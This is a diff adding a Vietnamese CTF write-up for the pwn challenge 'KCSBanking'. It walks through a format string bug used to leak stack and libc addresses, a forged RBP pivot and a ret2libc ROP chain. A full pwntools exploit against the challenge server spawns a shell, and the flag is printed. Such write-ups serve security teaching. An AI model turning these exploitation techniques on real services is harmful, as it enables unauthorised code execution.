@@ -361,3 +361,235 @@ Nhìn sơ qua các kết quả thu được, ta có được flag là **`KCSC{r3
 **Solution**
 
 Updating... 
+
+## pwn/KCSBanking
+
+{{< admonition note "Challenge Information" >}}
+* 10 solve / 464 pts / by JohnathanHuuTri
+* **Given files:** [banking.zip]()
+* **Description:** Our club KCSC has created a new bank called KCSBank. It's still in beta but we cannot find out any bugs, please help us!\
+**`nc 103.163.24.78 10002`**
+{{< /admonition >}}
+
+**Solution**
+
+### Overview
+
+Chương trình có 2 lựa chọn chính:
+- general_action 
+- account_action 
+
+```c
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  int main_status; // [rsp+Ch] [rbp-4h]
+
+  main_status = 0;
+  init(argc, argv, envp);
+  puts("Welcome to KCSBank");
+  while ( !main_status )
+  {
+    main_status = general_action();
+    if ( !main_status )
+      account_action();
+  }
+  return 0;
+}
+```
+
+Với lựa chọn **`general_action`**, chương trình có 3 chức năng: 
+- login
+- register
+- exit
+
+Trong hàm **`register`**, fullname được chứa ở **`ptr_fullname`**. Khi xref, ta thấy nó còn được xuất hiện ở hàm **`info`**.  
+
+<img src="./5.png">
+
+Với lựa chọn **`account_action`**, chương trình có 4 chức năng: 
+- deposit
+- withdraw
+- info
+- logout 
+
+Xem qua một lượt các hàm, ta thấy hàm **`info`** có Format String Bug. 
+```c
+int info()
+{
+  printf(ptr_fullname);                         // fsb
+  return printf("Money: %u\n", total_money);
+}
+```
+
+### Format String Bug 
+
+Đề bài cho chúng ta Dockerfile, hướng tiếp cận của mình là tận dụng bug trên để Return To Libc. 
+
+Mình định nghĩa một số hàm để thao tác nhanh với chương trình như sau
+```python
+def login(username, password): 
+    sla(b"> ", b"1")
+    sla(b"Username: ", username.encode("utf8"))
+    sla(b"Password: ", str(password).encode("utf8"))
+
+def register(username, password, fullname): 
+    sla(b"> ", b"2")
+    sla(b"New username: ", username.encode("utf8"))
+    sla(b"New password: ", str(password).encode("utf8"))
+    sla(b"Your full name: ", fullname)
+
+def info():
+    sla(b"> ", b"3")
+
+def logout(feedback): 
+    sla(b"> ", b"4")
+    sla(b"Please leave a feedback: ", feedback)
+```
+
+#### Leak stack & libc 
+Bước đầu tiên, chúng ta sẽ đi tạo một account với fullname là **`payload`** nhằm leak được các giá trị như stack, libc. 
+
+```python
+payload = b"%6$p|%29$p|"
+register("hacker", 123, payload)
+login("hacker", 123) 
+info()
+
+data_leak  = rl().strip().split(b"|")
+stack_leak = int(data_leak[0], 16)
+libc_leak  = int(data_leak[1], 16) 
+libc_base  = libc_leak - libc.symbols["puts"] - 0x01fa
+
+log.info(f"stack leak = {hex(stack_leak)}")
+log.info(f"libc leak = {hex(libc_leak)}")
+log.info(f"libc base = {hex(libc_base)}")
+```
+
+#### Stack Buffer Overflow 
+
+Về cơ bản, chương trình không có bug BOF. Nhưng chúng ta đang có một số thứ để có thể trigger được bug này. 
+- Chức năng **`logout`** cho nhập feedback có kích thước tối đa 256 byte. 
+- FSB cho phép thay đổi giá trị của thanh ghi **`RBP`**. 
+
+Khi end chương trình, **`RSP`** sẽ nằm ở vị trí **`0x00007fffffffdc48`**, vậy **`RBP`** sẽ là **`0x00007fffffffdc40`**. 
+
+<img src="./6.png">
+
+Với FSB đầu tiên, ta thấy **`RBP`** phía trên nằm ngay ở ô stack đầu tiên. Ta hoàn toàn thay đổi được giá trị cho nó. 
+
+<img src="./7.png">
+
+Feedback của chúng ta được nhập bắt đầu từ **`0x00007fffffffdb10`**. Vậy mình sẽ đưa **`RBP`** về **`0x00007fffffffdb50`** để thử trigger xem. 
+
+Lưu ý, giá trị **`stack_leak`** mình có được ở phía trên là **`0x00007fffffffdc20`**. 
+
+```python
+fake_rbp = stack_leak - 0xd0 
+log.info(f"fake rbp = {hex(fake_rbp)}")
+
+payload = f"%{fake_rbp & 0xFFFF}c%6$hn"
+register("hacker", 123, payload)
+login("hacker", 123) 
+info()
+```
+
+Stack layout sau khi mình đổi **`RBP`** và nhập feedback 
+
+<img src="./8.png">
+
+Trigger thành công với input
+
+```python
+b"a" * 72 + b"1234567\n"
+```
+
+<img src="./9.png">
+
+### Build ropchain
+Okay, việc chúng ta bây giờ chỉ là đi build ropchain và lấy shell. 
+```python
+#!/usr/bin/env python3
+
+from pwn import *
+
+exe = ELF("./banking_patched") 
+libc = ELF("./libc.so.6")
+ld = ELF("./ld-linux-x86-64.so.2")
+
+context.update(os = "linux", arch = "amd64", log_level = "debug", terminal = "cmd.exe /c start wsl".split(), binary = exe)
+
+# p = process(exe.path)
+p = remote("103.163.24.78", 10002)
+
+sl  = p.sendline
+sa  = p.sendafter
+sla = p.sendlineafter
+rl  = p.recvline
+ru  = p.recvuntil
+
+def debug():
+    gdb.attach(p, gdbscript = """
+        b *info+23
+        b *main+0x54
+        continue
+    """)
+    pause() 
+
+def login(username, password): 
+    sla(b"> ", b"1")
+    sla(b"Username: ", username.encode("utf8"))
+    sla(b"Password: ", str(password).encode("utf8"))
+
+def register(username, password, fullname): 
+    sla(b"> ", b"2")
+    sla(b"New username: ", username.encode("utf8"))
+    sla(b"New password: ", str(password).encode("utf8"))
+    sla(b"Your full name: ", fullname)
+
+def info():
+    sla(b"> ", b"3")
+
+def logout(feedback): 
+    sla(b"> ", b"4")
+    sla(b"Please leave a feedback: ", feedback)
+
+# debug()
+
+# Leak stack + libc 
+payload = b"%6$p|%29$p|"
+register("hacker", 123, payload)
+login("hacker", 123) 
+info()
+
+data_leak  = rl().strip().split(b"|")
+stack_leak = int(data_leak[0], 16)
+libc_leak  = int(data_leak[1], 16) 
+libc_base  = libc_leak - libc.symbols["puts"] - 0x01fa
+
+log.info(f"stack leak = {hex(stack_leak)}")
+log.info(f"libc leak = {hex(libc_leak)}")
+log.info(f"libc base = {hex(libc_base)}")
+
+logout(b"new_feedback")
+
+# Change RBP
+fake_rbp = stack_leak - 0xd0 
+log.info(f"fake rbp = {hex(fake_rbp)}")
+
+payload = f"%{fake_rbp & 0xFFFF}c%6$hn"
+register("hacker", 123, payload)
+login("hacker", 123) 
+info()
+
+# Build ropchain 
+binsh  = libc_base + next(libc.search(b"/bin/sh\x00"))
+system = libc_base + libc.symbols["system"]
+poprdi = libc_base + 0x240e5
+ret    = poprdi + 1
+
+payload = b"a"*72 + p64(ret) + p64(poprdi) + p64(binsh) + p64(system)
+logout(payload) 
+
+p.interactive() 
+```
+Flag thu được là **`KCSC{st1ll_buff3r_0v3rfl0w_wh3n_h4s_c4n4ry?!?}`**
